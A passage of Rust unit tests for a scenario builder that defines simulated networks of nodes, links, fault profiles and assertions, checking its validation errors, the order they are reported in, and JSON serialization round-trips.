            assert!(zero_seed_result.is_err(), "Zero seed should be rejected");
            if let Err(ScenarioBuilderError::NoSeed) = zero_seed_result {
                // Expected error
            } else {
                panic!("Zero seed should produce NoSeed error");
            }

            // Test: Link validation with self-referential topology
            let self_loop_result = ScenarioBuilder::new("self-loop")
                .seed(777)
                .add_node("self_node", "Self Node", NodeRole::Coordinator)
                .unwrap()
                .add_node("other_node", "Other Node", NodeRole::Participant)
                .unwrap()
                .add_link("self_link", "self_node", "self_node", true)
                .unwrap()
                .add_link("normal_link", "self_node", "other_node", false)
                .unwrap()
                .build();
            assert!(
                self_loop_result.is_ok(),
                "Self-referential links should be valid"
            );

            // Test: Empty scenario name boundary condition
            let empty_name_result = ScenarioBuilder::new("")
                .seed(666)
                .add_node("n1", "Node 1", NodeRole::Coordinator)
                .unwrap()
                .add_node("n2", "Node 2", NodeRole::Participant)
                .unwrap()
                .build();
            assert!(
                empty_name_result.is_err(),
                "Empty scenario name should be rejected"
            );
            if let Err(ScenarioBuilderError::EmptyName) = empty_name_result {
                // Expected error
            } else {
                panic!("Empty name should produce EmptyName error");
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ---------------------------------------------------------------
    // Helpers
    // ---------------------------------------------------------------

    /// Build a minimal valid scenario for reuse.
    fn minimal_builder() -> ScenarioBuilder {
        ScenarioBuilder::new("test-scenario")
            .description("Minimal two-node scenario")
            .seed(42)
    }

    fn two_node_builder() -> Result<ScenarioBuilder, ScenarioBuilderError> {
        minimal_builder()
            .add_node("n1", "Node One", NodeRole::Coordinator)?
            .add_node("n2", "Node Two", NodeRole::Participant)
    }

    // ---------------------------------------------------------------
    // Happy path
    // ---------------------------------------------------------------

    #[test]
    fn test_happy_path_build() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .set_fault_profile("link-1", LinkFaultConfig::default())
            .add_assertion(ScenarioAssertion::AllNodesReachQuiescence)
            .add_assertion(ScenarioAssertion::MessageDelivered {
                from: "n1".into(),
                to: "n2".into(),
                within_ticks: 100,
            })
            .build()
            .unwrap();

        assert_eq!(scenario.name, "test-scenario");
        assert_eq!(scenario.description, "Minimal two-node scenario");
        assert_eq!(scenario.seed, 42);
        assert_eq!(scenario.schema_version, SCHEMA_VERSION);
        assert_eq!(scenario.node_count(), 2);
        assert_eq!(scenario.link_count(), 1);
        assert_eq!(scenario.assertion_count(), 2);
        assert!(scenario.has_node("n1"));
        assert!(scenario.has_node("n2"));
        assert!(!scenario.has_node("n3"));
        assert!(scenario.fault_profile_for("link-1").is_some());
        assert!(scenario.fault_profile_for("link-2").is_none());
    }

    #[test]
    fn test_happy_path_many_nodes() {
        let mut builder = minimal_builder();
        for i in 0..MAX_NODES {
            builder = builder
                .add_node(format!("n{i}"), format!("Node {i}"), NodeRole::Participant)
                .unwrap();
        }
        let scenario = builder.build().unwrap();
        assert_eq!(scenario.node_count(), MAX_NODES);
    }

    #[test]
    fn test_happy_path_unidirectional_link() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", false)
            .unwrap()
            .build()
            .unwrap();

        assert!(!scenario.links[0].bidirectional);
    }

    #[test]
    fn test_happy_path_bidirectional_link() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .build()
            .unwrap();

        assert!(scenario.links[0].bidirectional);
    }

    #[test]
    fn test_happy_path_all_assertion_variants() {
        let scenario = two_node_builder()
            .unwrap()
            .add_assertion(ScenarioAssertion::AllNodesReachQuiescence)
            .add_assertion(ScenarioAssertion::MessageDelivered {
                from: "n1".into(),
                to: "n2".into(),
                within_ticks: 50,
            })
            .add_assertion(ScenarioAssertion::PartitionDetected {
                by_node: "n1".into(),
                within_ticks: 200,
            })
            .add_assertion(ScenarioAssertion::EpochTransitionCompleted {
                epoch: 5,
                within_ticks: 1000,
            })
            .add_assertion(ScenarioAssertion::NoDeadlock { within_ticks: 500 })
            .build()
            .unwrap();

        assert_eq!(scenario.assertion_count(), 5);
    }

    #[test]
    fn test_happy_path_all_node_roles() {
        let scenario = minimal_builder()
            .add_node("coord", "Coordinator Node", NodeRole::Coordinator)
            .unwrap()
            .add_node("part", "Participant Node", NodeRole::Participant)
            .unwrap()
            .add_node("obs", "Observer Node", NodeRole::Observer)
            .unwrap()
            .build()
            .unwrap();

        assert_eq!(scenario.nodes[0].role, NodeRole::Coordinator);
        assert_eq!(scenario.nodes[1].role, NodeRole::Participant);
        assert_eq!(scenario.nodes[2].role, NodeRole::Observer);
    }

    #[test]
    fn test_happy_path_no_links_no_assertions() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        assert_eq!(scenario.link_count(), 0);
        assert_eq!(scenario.assertion_count(), 0);
    }

    #[test]
    fn test_happy_path_multiple_links_with_fault_profiles() {
        let lossy_config = LinkFaultConfig {
            drop_probability: 0.3,
            reorder_depth: 2,
            corrupt_bit_count: 1,
            delay_ticks: 5,
            partition: false,
        };

        let scenario = two_node_builder()
            .unwrap()
            .add_link("fwd", "n1", "n2", false)
            .unwrap()
            .add_link("rev", "n2", "n1", false)
            .unwrap()
            .set_fault_profile("fwd", lossy_config.clone())
            .set_fault_profile("rev", LinkFaultConfig::default())
            .build()
            .unwrap();

        assert_eq!(scenario.link_count(), 2);
        let fwd = scenario.fault_profile_for("fwd").unwrap();
        assert!((fwd.drop_probability - 0.3).abs() < f64::EPSILON);
        assert_eq!(fwd.reorder_depth, 2);
        assert_eq!(fwd.corrupt_bit_count, 1);
        assert_eq!(fwd.delay_ticks, 5);
    }

    // ---------------------------------------------------------------
    // Missing seed error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_missing_seed() {
        let result = ScenarioBuilder::new("no-seed")
            .add_node("n1", "Node 1", NodeRole::Coordinator)
            .unwrap()
            .add_node("n2", "Node 2", NodeRole::Participant)
            .unwrap()
            .build();

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(err, ScenarioBuilderError::NoSeed));
        assert!(err.to_string().contains(ERR_SB_NO_SEED));
    }

    #[test]
    fn test_error_zero_seed() {
        let result = ScenarioBuilder::new("zero-seed")
            .seed(0)
            .add_node("n1", "Node 1", NodeRole::Coordinator)
            .unwrap()
            .add_node("n2", "Node 2", NodeRole::Participant)
            .unwrap()
            .build();

        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), ScenarioBuilderError::NoSeed));
    }

    // ---------------------------------------------------------------
    // Too few nodes error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_zero_nodes() {
        let result = minimal_builder().build();
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(
            err,
            ScenarioBuilderError::TooFewNodes {
                count: 0,
                minimum: 2,
            }
        ));
        assert!(err.to_string().contains(ERR_SB_TOO_FEW_NODES));
    }

    #[test]
    fn test_error_one_node() {
        let result = minimal_builder()
            .add_node("n1", "Only Node", NodeRole::Coordinator)
            .unwrap()
            .build();

        assert!(result.is_err());
        assert!(matches!(
            result.unwrap_err(),
            ScenarioBuilderError::TooFewNodes {
                count: 1,
                minimum: 2,
            }
        ));
    }

    // ---------------------------------------------------------------
    // Too many nodes error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_too_many_nodes() {
        let mut builder = minimal_builder();
        for i in 0..=MAX_NODES {
            builder = builder
                .add_node(format!("n{i}"), format!("Node {i}"), NodeRole::Participant)
                .unwrap();
        }
        let result = builder.build();
        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(
            err,
            ScenarioBuilderError::TooManyNodes {
                count: 11,
                maximum: 10
            }
        ));
        assert!(err.to_string().contains(ERR_SB_TOO_MANY_NODES));
    }

    // ---------------------------------------------------------------
    // Invalid link endpoints error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_invalid_source_endpoint() {
        let result = two_node_builder()
            .unwrap()
            .add_link("bad-link", "nonexistent", "n2", false)
            .unwrap()
            .build();

        assert!(result.is_err());
        let err = result.unwrap_err();
        match &err {
            ScenarioBuilderError::InvalidLinkEndpoint {
                link_id,
                missing_node,
            } => {
                assert_eq!(link_id, "bad-link");
                assert_eq!(missing_node, "nonexistent");
            }
            other => unreachable!("expected InvalidLinkEndpoint, got {other}"),
        }
        assert!(err.to_string().contains(ERR_SB_INVALID_LINK_ENDPOINT));
    }

    #[test]
    fn test_error_invalid_target_endpoint() {
        let result = two_node_builder()
            .unwrap()
            .add_link("bad-link", "n1", "ghost", false)
            .unwrap()
            .build();

        assert!(result.is_err());
        match result.unwrap_err() {
            ScenarioBuilderError::InvalidLinkEndpoint {
                link_id,
                missing_node,
            } => {
                assert_eq!(link_id, "bad-link");
                assert_eq!(missing_node, "ghost");
            }
            other => unreachable!("expected InvalidLinkEndpoint, got {other}"),
        }
    }

    // ---------------------------------------------------------------
    // Duplicate node / link errors
    // ---------------------------------------------------------------

    #[test]
    fn test_error_duplicate_node() {
        let result = minimal_builder()
            .add_node("dup", "First", NodeRole::Coordinator)
            .unwrap()
            .add_node("dup", "Second", NodeRole::Participant);

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateNode { ref node_id } if node_id == "dup"
        ));
        assert!(err.to_string().contains(ERR_SB_DUPLICATE_NODE));
    }

    #[test]
    fn test_error_duplicate_link() {
        let result = two_node_builder()
            .unwrap()
            .add_link("L1", "n1", "n2", true)
            .unwrap()
            .add_link("L1", "n2", "n1", false);

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateLink { ref link_id } if link_id == "L1"
        ));
        assert!(err.to_string().contains(ERR_SB_DUPLICATE_LINK));
    }

    // ---------------------------------------------------------------
    // Empty name error
    // ---------------------------------------------------------------

    #[test]
    fn test_error_empty_name() {
        let result = ScenarioBuilder::new("")
            .seed(1)
            .add_node("n1", "A", NodeRole::Coordinator)
            .unwrap()
            .add_node("n2", "B", NodeRole::Participant)
            .unwrap()
            .build();

        assert!(result.is_err());
        let err = result.unwrap_err();
        assert!(matches!(err, ScenarioBuilderError::EmptyName));
        assert!(err.to_string().contains(ERR_SB_EMPTY_NAME));
    }

    #[test]
    fn test_error_empty_name_precedes_seed_and_node_bounds() {
        let err = ScenarioBuilder::new("")
            .build()
            .expect_err("empty names must fail before later validation");

        assert!(matches!(err, ScenarioBuilderError::EmptyName));
    }

    #[test]
    fn test_error_missing_seed_precedes_node_bounds() {
        let err = ScenarioBuilder::new("missing-seed")
            .build()
            .expect_err("missing seed must fail before node bounds");

        assert!(matches!(err, ScenarioBuilderError::NoSeed));
    }

    #[test]
    fn test_error_too_few_nodes_precedes_invalid_link_endpoint() {
        let err = minimal_builder()
            .add_node("n1", "Only Node", NodeRole::Coordinator)
            .unwrap()
            .add_link("bad-link", "n1", "ghost", false)
            .unwrap()
            .build()
            .expect_err("node bounds must fail before endpoint validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::TooFewNodes {
                count: 1,
                minimum: 2,
            }
        ));
    }

    #[test]
    fn test_scenario_to_json_rejects_duplicate_node_before_link_validation() {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: "duplicate-node".to_string(),
            description: String::new(),
            seed: 42,
            nodes: vec![
                VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                },
                VirtualNode {
                    id: "n1".to_string(),
                    name: "Duplicate Node 1".to_string(),
                    role: NodeRole::Participant,
                },
            ],
            links: vec![VirtualLink {
                id: "bad-link".to_string(),
                source_node: "missing".to_string(),
                target_node: "n1".to_string(),
                bidirectional: false,
            }],
            fault_profiles: BTreeMap::new(),
            assertions: Vec::new(),
        };

        let err = scenario
            .to_json()
            .expect_err("duplicate nodes must fail before link validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateNode { ref node_id } if node_id == "n1"
        ));
    }

    #[test]
    fn test_scenario_to_json_rejects_duplicate_link_before_fault_profiles() {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: "duplicate-link".to_string(),
            description: String::new(),
            seed: 42,
            nodes: vec![
                VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                },
                VirtualNode {
                    id: "n2".to_string(),
                    name: "Node 2".to_string(),
                    role: NodeRole::Participant,
                },
            ],
            links: vec![
                VirtualLink {
                    id: "dup-link".to_string(),
                    source_node: "n1".to_string(),
                    target_node: "n2".to_string(),
                    bidirectional: true,
                },
                VirtualLink {
                    id: "dup-link".to_string(),
                    source_node: "n2".to_string(),
                    target_node: "n1".to_string(),
                    bidirectional: false,
                },
            ],
            fault_profiles: BTreeMap::from([(
                "ghost-link".to_string(),
                LinkFaultConfig {
                    drop_probability: 2.0,
                    ..LinkFaultConfig::default()
                },
            )]),
            assertions: Vec::new(),
        };

        let err = scenario
            .to_json()
            .expect_err("duplicate links must fail before fault profile validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateLink { ref link_id } if link_id == "dup-link"
        ));
    }

    // ---------------------------------------------------------------
    // Roundtrip serialization
    // ---------------------------------------------------------------

    #[test]
    fn test_scenario_json_roundtrip() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .set_fault_profile(
                "link-1",
                LinkFaultConfig {
                    drop_probability: 0.1,
                    reorder_depth: 3,
                    corrupt_bit_count: 2,
                    delay_ticks: 10,
                    partition: false,
                },
            )
            .add_assertion(ScenarioAssertion::AllNodesReachQuiescence)
            .add_assertion(ScenarioAssertion::NoDeadlock { within_ticks: 500 })
            .build()
            .unwrap();

        let json = scenario.to_json().unwrap();
        assert!(!json.is_empty());

        let restored = Scenario::from_json(&json).unwrap();
        assert_eq!(restored.name, scenario.name);
        assert_eq!(restored.description, scenario.description);
        assert_eq!(restored.seed, scenario.seed);
        assert_eq!(restored.schema_version, scenario.schema_version);
        assert_eq!(restored.nodes, scenario.nodes);
        assert_eq!(restored.links, scenario.links);
        assert_eq!(restored.fault_profiles, scenario.fault_profiles);
        assert_eq!(restored.assertions, scenario.assertions);
    }

    #[test]
    fn test_scenario_to_json_rejects_invalid_fault_profile_before_serialization() {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: "invalid".to_string(),
            description: String::new(),
            seed: 42,
            nodes: vec![
                VirtualNode {
                    id: "n1".to_string(),
                    name: "Node 1".to_string(),
                    role: NodeRole::Coordinator,
                },
                VirtualNode {
                    id: "n2".to_string(),
                    name: "Node 2".to_string(),
                    role: NodeRole::Participant,
                },
            ],
            links: vec![VirtualLink {
                id: "link-1".to_string(),
                source_node: "n1".to_string(),
                target_node: "n2".to_string(),
                bidirectional: true,
            }],
            fault_profiles: BTreeMap::from([(
                "link-1".to_string(),
                LinkFaultConfig {
                    drop_probability: f64::NAN,
                    ..LinkFaultConfig::default()
                },
            )]),
            assertions: Vec::new(),
        };

        let err = scenario
            .to_json()
            .expect_err("invalid fault profile must fail");
        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidFaultProfile { .. }
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_malformed_json_before_validation() {
        let err = Scenario::from_json("{\"schema_version\":\"sb-v1.0\"}")
            .expect_err("missing fields must be rejected by JSON parsing");

        assert!(matches!(err, ScenarioBuilderError::JsonParse { .. }));
    }

    #[test]
    fn test_scenario_from_json_rejects_empty_name_before_zero_seed() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["name"] = serde_json::json!("");
        value["seed"] = serde_json::json!(0);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("empty name must fail first");

        assert!(matches!(err, ScenarioBuilderError::EmptyName));
    }

    #[test]
    fn test_scenario_from_json_rejects_negative_drop_probability() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .build()
            .unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["fault_profiles"] = serde_json::json!({
            "link-1": {
                "drop_probability": -0.5,
                "reorder_depth": 0,
                "corrupt_bit_count": 0,
                "delay_ticks": 0,
                "partition": false
            }
        });

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("negative probability must fail closed");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidFaultProfile { ref link_id, .. }
                if link_id == "link-1"
        ));
    }

    #[test]
    fn test_push_bounded_zero_capacity_clears_existing_nodes() {
        let mut nodes = vec![VirtualNode {
            id: "n1".to_string(),
            name: "Node 1".to_string(),
            role: NodeRole::Coordinator,
        }];

        push_bounded(
            &mut nodes,
            VirtualNode {
                id: "n2".to_string(),
                name: "Node 2".to_string(),
                role: NodeRole::Participant,
            },
            0,
        );

        assert!(nodes.is_empty());
    }

    #[test]
    fn test_scenario_from_json_rejects_duplicate_node_ids() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["nodes"] = serde_json::json!([
            {
                "id": "n1",
                "name": "Node One",
                "role": "Coordinator"
            },
            {
                "id": "n1",
                "name": "Duplicate Node One",
                "role": "Participant"
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("duplicate node ids must fail");

        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateNode { ref node_id } if node_id == "n1"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_duplicate_link_ids() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .build()
            .unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["links"] = serde_json::json!([
            {
                "id": "dup-link",
                "source_node": "n1",
                "target_node": "n2",
                "bidirectional": true
            },
            {
                "id": "dup-link",
                "source_node": "n2",
                "target_node": "n1",
                "bidirectional": false
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("duplicate link ids must fail");

        assert!(matches!(
            err,
            ScenarioBuilderError::DuplicateLink { ref link_id } if link_id == "dup-link"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_target_link_endpoint_when_source_exists() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["links"] = serde_json::json!([
            {
                "id": "bad-target",
                "source_node": "n1",
                "target_node": "ghost-target",
                "bidirectional": false
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("missing target endpoint must fail");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidLinkEndpoint {
                ref link_id,
                ref missing_node
            } if link_id == "bad-target" && missing_node == "ghost-target"
        ));
    }

    #[test]
    fn test_scenario_from_json_reports_message_delivered_from_before_to_reference() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["assertions"] = serde_json::json!([
            {
                "MessageDelivered": {
                    "from": "ghost-from",
                    "to": "ghost-to",
                    "within_ticks": 10
                }
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("missing from endpoint must fail before missing to endpoint");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "MessageDelivered.from" && node_id == "ghost-from"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_partition_detection_unknown_node() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["assertions"] = serde_json::json!([
            {
                "PartitionDetected": {
                    "by_node": "ghost-partition",
                    "within_ticks": 10
                }
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("partition assertion node must exist");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "PartitionDetected.by_node" && node_id == "ghost-partition"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_drop_probability_above_one() {
        let scenario = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .build()
            .unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["fault_profiles"] = serde_json::json!({
            "link-1": {
                "drop_probability": 1.5,
                "reorder_depth": 0,
                "corrupt_bit_count": 0,
                "delay_ticks": 0,
                "partition": false
            }
        });

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("probability above one must fail");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidFaultProfile { ref link_id, .. }
                if link_id == "link-1"
        ));
    }

    #[test]
    fn test_scenario_serde_node_roles() {
        let scenario = minimal_builder()
            .add_node("c", "Coord", NodeRole::Coordinator)
            .unwrap()
            .add_node("p", "Part", NodeRole::Participant)
            .unwrap()
            .add_node("o", "Obs", NodeRole::Observer)
            .unwrap()
            .build()
            .unwrap();

        let json = serde_json::to_string(&scenario).unwrap();
        let restored: Scenario = serde_json::from_str(&json).unwrap();
        assert_eq!(restored.nodes[0].role, NodeRole::Coordinator);
        assert_eq!(restored.nodes[1].role, NodeRole::Participant);
        assert_eq!(restored.nodes[2].role, NodeRole::Observer);
    }

    #[test]
    fn test_scenario_serde_all_assertion_variants() {
        let scenario = two_node_builder()
            .unwrap()
            .add_assertion(ScenarioAssertion::AllNodesReachQuiescence)
            .add_assertion(ScenarioAssertion::MessageDelivered {
                from: "n1".into(),
                to: "n2".into(),
                within_ticks: 100,
            })
            .add_assertion(ScenarioAssertion::PartitionDetected {
                by_node: "n1".into(),
                within_ticks: 200,
            })
            .add_assertion(ScenarioAssertion::EpochTransitionCompleted {
                epoch: 3,
                within_ticks: 1000,
            })
            .add_assertion(ScenarioAssertion::NoDeadlock { within_ticks: 500 })
            .build()
            .unwrap();

        let json = serde_json::to_string(&scenario).unwrap();
        let restored: Scenario = serde_json::from_str(&json).unwrap();
        assert_eq!(restored.assertions, scenario.assertions);
    }

    #[test]
    fn test_build_rejects_fault_profile_for_unknown_link() {
        let err = two_node_builder()
            .unwrap()
            .set_fault_profile("ghost-link", LinkFaultConfig::default())
            .build()
            .expect_err("fault profile must target an existing link");

        assert!(matches!(
            err,
            ScenarioBuilderError::UnknownFaultProfileLink { ref link_id }
                if link_id == "ghost-link"
        ));
    }

    #[test]
    fn test_build_rejects_invalid_fault_profile() {
        let err = two_node_builder()
            .unwrap()
            .add_link("link-1", "n1", "n2", true)
            .unwrap()
            .set_fault_profile(
                "link-1",
                LinkFaultConfig {
                    drop_probability: 1.5,
                    ..LinkFaultConfig::default()
                },
            )
            .build()
            .expect_err("invalid fault profile must fail closed");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidFaultProfile { ref link_id, .. }
                if link_id == "link-1"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_invalid_schema_version() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["schema_version"] = serde_json::Value::String("sb-v0.9".to_string());

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("schema version must be validated");
        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidSchemaVersion { ref found } if found == "sb-v0.9"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_fault_profile_for_unknown_link() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["fault_profiles"] = serde_json::json!({
            "ghost-link": {
                "drop_probability": 0.0,
                "reorder_depth": 0,
                "corrupt_bit_count": 0,
                "delay_ticks": 0,
                "partition": false
            }
        });

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("unknown fault profile link must fail");
        assert!(matches!(
            err,
            ScenarioBuilderError::UnknownFaultProfileLink { ref link_id }
                if link_id == "ghost-link"
        ));
    }

    #[test]
    fn test_build_rejects_assertion_reference_to_unknown_node() {
        let err = two_node_builder()
            .unwrap()
            .add_assertion(ScenarioAssertion::MessageDelivered {
                from: "n1".into(),
                to: "ghost".into(),
                within_ticks: 10,
            })
            .build()
            .expect_err("assertions must reference existing nodes");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "MessageDelivered.to" && node_id == "ghost"
        ));
    }

    #[test]
    fn test_build_reports_message_delivered_from_before_to_reference() {
        let err = two_node_builder()
            .unwrap()
            .add_assertion(ScenarioAssertion::MessageDelivered {
                from: "ghost-from".into(),
                to: "ghost-to".into(),
                within_ticks: 10,
            })
            .build()
            .expect_err("missing from endpoint must fail before missing to endpoint");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "MessageDelivered.from" && node_id == "ghost-from"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_link_endpoint_before_assertions() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["links"] = serde_json::json!([
            {
                "id": "bad-link",
                "source_node": "ghost-source",
                "target_node": "n2",
                "bidirectional": false
            }
        ]);
        value["assertions"] = serde_json::json!([
            {
                "PartitionDetected": {
                    "by_node": "ghost-assertion",
                    "within_ticks": 10
                }
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("link endpoints must fail before assertion references");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidLinkEndpoint {
                ref link_id,
                ref missing_node
            } if link_id == "bad-link" && missing_node == "ghost-source"
        ));
    }

    #[test]
    fn test_scenario_from_json_rejects_assertion_reference_to_unknown_node() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["assertions"] = serde_json::json!([
            {
                "MessageDelivered": {
                    "from": "n1",
                    "to": "ghost",
                    "within_ticks": 10
                }
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json).expect_err("assertions must be validated");
        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "MessageDelivered.to" && node_id == "ghost"
        ));
    }

    #[test]
    fn test_build_rejects_partition_detection_assertion_reference_to_unknown_node() {
        let err = two_node_builder()
            .unwrap()
            .add_assertion(ScenarioAssertion::PartitionDetected {
                by_node: "ghost".into(),
                within_ticks: 10,
            })
            .build()
            .expect_err("partition assertions must reference existing nodes");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidAssertionNode {
                ref assertion,
                ref node_id
            } if assertion == "PartitionDetected.by_node" && node_id == "ghost"
        ));
    }

    #[test]
    fn negative_invalid_schema_precedes_empty_name_and_seed_validation() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["schema_version"] = serde_json::json!("sb-v999");
        value["name"] = serde_json::json!("");
        value["seed"] = serde_json::json!(0);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("schema version must fail before name or seed validation");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidSchemaVersion { ref found } if found == "sb-v999"
        ));
    }

    #[test]
    fn negative_empty_name_precedes_duplicate_node_validation() {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: String::new(),
            description: String::new(),
            seed: 42,
            nodes: vec![
                VirtualNode {
                    id: "n1".into(),
                    name: "Node 1".into(),
                    role: NodeRole::Coordinator,
                },
                VirtualNode {
                    id: "n1".into(),
                    name: "Duplicate Node 1".into(),
                    role: NodeRole::Participant,
                },
            ],
            links: Vec::new(),
            fault_profiles: BTreeMap::new(),
            assertions: Vec::new(),
        };

        let err = scenario
            .to_json()
            .expect_err("empty name must fail before duplicate nodes");

        assert!(matches!(err, ScenarioBuilderError::EmptyName));
    }

    #[test]
    fn negative_no_seed_precedes_duplicate_node_validation() {
        let scenario = Scenario {
            schema_version: SCHEMA_VERSION.to_string(),
            name: "zero-seed-duplicate-node".into(),
            description: String::new(),
            seed: 0,
            nodes: vec![
                VirtualNode {
                    id: "n1".into(),
                    name: "Node 1".into(),
                    role: NodeRole::Coordinator,
                },
                VirtualNode {
                    id: "n1".into(),
                    name: "Duplicate Node 1".into(),
                    role: NodeRole::Participant,
                },
            ],
            links: Vec::new(),
            fault_profiles: BTreeMap::new(),
            assertions: Vec::new(),
        };

        let err = scenario
            .to_json()
            .expect_err("zero seed must fail before duplicate nodes");

        assert!(matches!(err, ScenarioBuilderError::NoSeed));
    }

    #[test]
    fn negative_missing_source_endpoint_precedes_missing_target_endpoint() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["links"] = serde_json::json!([
            {
                "id": "bad-both",
                "source_node": "ghost-source",
                "target_node": "ghost-target",
                "bidirectional": false
            }
        ]);

        let json = serde_json::to_string(&value).unwrap();
        let err = Scenario::from_json(&json)
            .expect_err("source endpoint must fail before target endpoint");

        assert!(matches!(
            err,
            ScenarioBuilderError::InvalidLinkEndpoint {
                ref link_id,
                ref missing_node
            } if link_id == "bad-both" && missing_node == "ghost-source"
        ));
    }

    #[test]
    fn negative_unknown_fault_profile_link_precedes_invalid_profile_content() {
        let scenario = two_node_builder().unwrap().build().unwrap();
        let mut value = serde_json::to_value(&scenario).unwrap();
        value["fault_profiles"] = serde_json::json!({
            "ghost-link": {
                "drop_probability": 9.9,
                "reorder_depth": 0,
                "corrupt_bit_count": 0,
                "delay_ticks": 0,
